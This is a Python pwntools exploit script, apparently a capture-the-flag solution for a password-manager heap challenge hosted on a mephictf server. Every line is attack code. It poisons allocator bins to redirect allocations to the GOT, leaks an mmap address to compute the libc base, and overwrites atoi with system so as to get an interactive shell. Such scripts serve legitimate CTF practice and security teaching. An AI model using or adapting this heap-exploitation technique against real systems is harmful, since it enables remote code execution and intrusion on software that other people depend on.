from pwn import *

#exe = context.binary = ELF('passwd_mngr')


def addx(idx,payload):
    io.sendline(str(1).encode())
    io.sendline(str(idx).encode())
    io.sendline(payload)
    return
def delx(idx):
    io.sendline(str(2).encode())
    io.sendline(str(idx).encode())
def prnt(idx):
    io.sendline(str(3).encode())
    io.sendline(str(idx).encode())
    return
def edit(idx,payload):
    io.sendline(str(4).encode())
    io.sendline(str(idx).encode())
    io.sendline(payload)
    return
mmap_offset = 0x11ebc0

got = 0x4040

system = 0x50d70

#io = process(exe.path)
#io = remote('localhost',749)
io = remote('pwn-1.mephictf.ru' ,7490)

addx(0,b'A'*0x7) #0x8 bin
addx(1,b'A'*0x7)

addx(2,b'A'*0xf) #0x10 bin
addx(3,b'A'*0xf)

addx(4,b'A'*0x1f) #0x18 bin
addx(5,b'A'*0x1f)

delx(0)
delx(1)

delx(2)
delx(3)

delx(4)
delx(5) #fill smartbin

edit(1,b'\x01') #0x8 bin poisoning to overwite heap base

addx(6,b'A'*0x7)

addx(7,p16(got)+b'\0'*5) #overwrite base to got

edit(3,p32(0x18)) #overwrite 0x10 bin to leak libc

addx(8,b'A'*0xf)

addx(9,b'A'*0x9) #libc leak

sleep(1)

io.recv()

prnt(9) #leak

sleep(1)

buf = io.recvline()

print(buf)

buf= buf.split(b'A'*8)[1][1:-1]

mmap_leak = int.from_bytes(buf,'little')

mmap_leak*=0x100

mmap_leak = mmap_leak+0xc0;

log.info('Mmap leak {0}'.format(hex(mmap_leak)))

libc_base = mmap_leak - mmap_offset -0x100

log.info('Libc base {0}'.format(hex(libc_base)))

edit(5,p32(0x40)) #overwrite atoi to system

addx(10,b'A'*0x1f)

addx(11,b'A'*8+p64(libc_base+system)+b'A'*(0x1f-0x10)) #overwrite

pause()

#io.sendline(b'/bin/sh -') #pop shell

io.interactive()

